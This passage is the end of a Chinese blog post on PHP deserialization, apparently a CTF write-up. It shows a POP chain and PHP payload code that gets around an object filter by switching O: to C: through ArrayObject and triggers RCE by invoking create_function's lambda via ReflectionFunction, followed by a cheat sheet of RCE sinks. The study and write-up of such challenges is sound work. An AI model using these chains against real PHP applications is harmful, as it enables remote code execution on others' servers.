+<p><strong>考点</strong>：正则绕过 (<code>O:</code> -&gt; <code>C:</code>)、<code>__unserialize</code>、<code>ReflectionFunction</code> RCE<br />
+<em>(注：本题虽非 Phar，但作为反序列化专题的进阶补充，极具价值)</em></p>
+</blockquote>
+<p><strong>1. 漏洞链路分析</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正则过滤 /^[Oa]:[\d]+/i -&gt; 使用 C:11:&quot;ArrayObject&quot; 绕过</span><br><span class="line">  -&gt; Taki::__unserialize() -&gt; ($this-&gt;musubi)() (musubi=Mitsuha)</span><br><span class="line">    -&gt; Mitsuha::__invoke() -&gt; 字符串拼接 $this-&gt;thread (thread=KatawareDoki)</span><br><span class="line">      -&gt; KatawareDoki::__toString() -&gt; $this-&gt;soul-&gt;flag() (soul=Taki)</span><br><span class="line">        -&gt; Taki::__call() -&gt; new ReflectionFunction(&#x27;\0lambda_1&#x27;)-&gt;invoke() 💥</span><br></pre></td></tr></table></figure>
+<p><strong>2. 核心难点：C: 协议与 Lambda 函数</strong></p>
+<ul>
+<li><strong><code>C:</code> 协议</strong>：当正则封死了 <code>O:</code> (对象) 和 <code>a:</code> (数组) 时，我们可以使用 <code>C:</code> (Custom Object Serialization)。它会调用类的 <code>__unserialize()</code> 方法。我们借用 PHP 内置类 <code>ArrayObject</code> 来包装我们的恶意 payload。</li>
+<li><strong><code>create_function</code> 与 反射</strong>：题目开头有 <code>create_function(&quot;&quot;, 'die(</code>/readflag<code>);');</code>。<code>create_function</code> 底层会创建一个名为 <code>\0lambda_1</code> 的匿名函数。我们通过 <code>ReflectionFunction</code> (反射类) 实例化该函数，并调用其 <code>invoke()</code> 方法执行代码。</li>
+</ul>
+<p><strong>3. Payload 构造细节</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Taki</span>(); <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Mitsuha</span>(); <span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">KatawareDoki</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;musubi = <span class="variable">$b</span>; <span class="variable">$b</span>-&gt;thread = <span class="variable">$c</span>; <span class="variable">$c</span>-&gt;soul = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;kuchikamizake = <span class="string">&quot;ReflectionFunction&quot;</span>; </span><br><span class="line"><span class="variable">$c</span>-&gt;name = <span class="string">&quot;\0lambda_1&quot;</span>; <span class="comment">// 注意空字节 \0</span></span><br><span class="line"><span class="variable">$a</span>-&gt;magic = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span> =&gt; <span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br><span class="line"><span class="comment">// 最后手动将序列化字符串开头的 O: 改为 C:</span></span><br></pre></td></tr></table></figure>
+<p><em>避坑指南：<code>create_function</code> 每次访问页面都会重新生成，lambda 后的数字会递增（如 <code>\0lambda_2</code>），实战中需重开容器或编写脚本动态爆破数字。</em></p>
+<hr />
+<h1 id="四-总结pop-链终点速查表"><a class="markdownIt-Anchor" href="#四-总结pop-链终点速查表"></a> 四、 总结：POP 链终点速查表</h1>
+<p>在构造反序列化链时，找到合适的“终点”（Sink）至关重要。以下是常见的 RCE 终点总结：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">终点类型</th>
+<th style="text-align:left">适用场景</th>
+<th style="text-align:left">示例代码 / 函数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>命令执行</strong></td>
+<td style="text-align:left">参数可控且无过滤</td>
+<td style="text-align:left"><code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>shell_exec()</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>代码执行</strong></td>
+<td style="text-align:left">需要执行 PHP 代码</td>
+<td style="text-align:left"><code>eval()</code>, <code>assert()</code>, <code>preg_replace</code> (e修饰符), <code>create_function</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>反射调用</strong></td>
+<td style="text-align:left">无直接执行函数时</td>
+<td style="text-align:left"><code>ReflectionFunction-&gt;invoke()</code>, <code>ReflectionMethod-&gt;invoke()</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>文件包含</strong></td>
+<td style="text-align:left">可控制文件路径时</td>
+<td style="text-align:left"><code>include()</code>, <code>require()</code>, <code>SplFileObject</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>文件写入</strong></td>
+<td style="text-align:left">配合 <code>.htaccess</code> 或日志</td>
+<td style="text-align:left"><code>file_put_contents()</code>, <code>fwrite()</code></td>
+</tr>
+</tbody>
+</table>
+<h1 id="五-参考文章"><a class="markdownIt-Anchor" href="#五-参考文章"></a> 五、参考文章</h1>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79708753/article/details/135873948?spm=1001.2014.3001.5506">phar反序列化+文件上传与例题讲解_phar文件上传-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291992.html">php phar反序列化总结 - FreeBuf网络安全行业门户</a></p>
+<p>[PHP Phar反序列化学习 - Zh1z3ven - 博客园](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/16786627.html#:~:text=Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://www.cnblogs.com/CoLo/p/16786627.html#:~:text=Phar反序列化</a> Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的 meta-data%2CPHP使用,phar_parse_metadata 在解析meta数据时，会调用 php_var_unserialize 进行反序列化操作。)</p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/%E7%AC%94%E8%AE%B0/" title="笔记" data-aos="zoom-in">笔记</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+          <img data-src="/images/covers/10.jpg" data-sizes="auto" alt="8.3-8.9" class="lazyload">
+        <a href="/2026/08/09/8-3-8-9/" aria-label="前一篇: 8.3-8.9" title="前一篇: 8.3-8.9"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            8.3-8.9
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+        <img data-src="/images/covers/03.jpg" data-sizes="auto" alt="2026.7.27-8.2" class="lazyload">
+      <a href="/2026/08/02/2026-7-27-8-2/" aria-label="后一篇: 2026.7.27-8.2"  title="后一篇: 2026.7.27-8.2"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          2026.7.27-8.2
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2026
+        <span class="footer-info-sep rotate"></span>
+      Ether
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        34.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:43
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text"> 一、 核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-phar-%E6%96%87%E4%BB%B6%E7%9A%84%E5%9B%9B%E6%AE%B5%E5%BC%8F%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text"> 1. Phar 文件的“四段式”结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BA%90%E7%A0%81%E7%BA%A7%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text"> 2. 源码级触发机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%AF%E8%A7%A6%E5%8F%91-phar-%E7%9A%84%E5%87%BD%E6%95%B0%E6%B8%85%E5%8D%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 3. 可触发 Phar 的函数清单</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-phar-%E7%9A%84%E7%94%9F%E6%88%90-%E4%BF%AE%E6%94%B9%E4%B8%8E%E7%BB%95%E8%BF%87%E4%BD%93%E7%B3%BB"><span class="toc-number">2.</span> <span class="toc-text"> 二、Phar 的生成、修改与绕过体系</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%94%9F%E6%88%90%E6%A8%A1%E6%9D%BF"><span class="toc-number">2.1.</span> <span class="toc-text"> 1. 基础生成模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-waf-%E7%BB%95%E8%BF%87%E4%BD%93%E7%B3%BB%E5%8C%96%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.</span> <span class="toc-text"> 2. WAF 绕过体系化总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83"><span class="toc-number">3.</span> <span class="toc-text"> 三、 实战演练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E4%B8%80unserialize-again-%E5%9F%BA%E7%A1%80-phar-%E7%AD%BE%E5%90%8D%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.1.</span> <span class="toc-text"> 例题一：Unserialize Again (基础 Phar + 签名修复)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E4%BA%8Cez-to-getflag-zip-%E5%8E%8B%E7%BC%A9-session-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">3.2.</span> <span class="toc-text"> 例题二：Ez to getflag (Zip 压缩 + Session 条件竞争)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E4%B8%89%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF-%E7%BA%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6c-%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%B0%84-rce"><span class="toc-number">3.3.</span> <span class="toc-text"> 例题三：君の名は (纯反序列化进阶：C: 协议与反射 RCE)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B-%E6%80%BB%E7%BB%93pop-%E9%93%BE%E7%BB%88%E7%82%B9%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">4.</span> <span class="toc-text"> 四、 总结：POP 链终点速查表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text"> 五、参考文章</span></a></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Ether" class="lazyload">
+  <div class="sidebar-author-name">Ether</div>
+  <div class="sidebar-description">求索本身即是归路</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-email sidebar-social-icon">
+      <a href=2930289360@qq.com itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/yourname itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/friends" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  <script>
+    var ALGOLIA_CONFIG = {
+      logo: "/images/algolia_logo.svg",
+      algolia: {
+        applicationID: "${ALGOLIA_APP_ID}",
+        apiKey: "${ALGOLIA_SEARCH_KEY}",
+        indexName: "${ALGOLIA_INDEX_NAME}",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": "搜索.....",
+          "hits_empty": "未发现与 「${query}」相关内容",
+          "hits_stats": "找到${hits}条结果（用时 ${time} ms）"
+        }
+      }
+    };
+  </script>
+  
+<script src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js" integrity="sha384-xvLS0jfKuoREs7pqkRI&#x2F;OI8GcqohO5S+jQz7ZBtQXnsXmD+9jDOOY4cL6dCPzlrk" crossorigin="anonymous" defer></script>
+
+  
+<script src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js" integrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l+M5Q2WH&#x2F;Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous" defer></script>
+
+  
+<script src="/js/algolia_search.js" defer></script>
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Ether",
+          title: "Phar反序列化",
+          url: "http://ether-lin.cn/2026/08/09/Phar/",
+          excerpt: "",
+          description: "",
+          stripContent: " 一、 核心原理  1. Phar 文件的“四段式”结构 Phar (Php ARchive) 类似 Java 的 JAR 包，其文件结构由四部分组成：    结构 作用 攻击面     Stub 文件头标识，格式必须为 xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt; 伪造文件头（如 GIF89a）绕过检测   Manifest 存储压缩文件属性、权限及 Meta-data 核心攻击点：Meta-data 以序列化形式存储   Contents 压缩文件的实际内",
+          date: "Sun Aug 09 2026 11:29:49 GMT+0800",
+          updated: "Sun Aug 09 2026 15:27:09 GMT+0800",
+          cover: "/images/covers/10.jpg",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.5' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js" integrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC+gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js" integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous" defer onload="renderMathInElement(_$(&#39;article&#39;), {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+  </body>
+  </html>
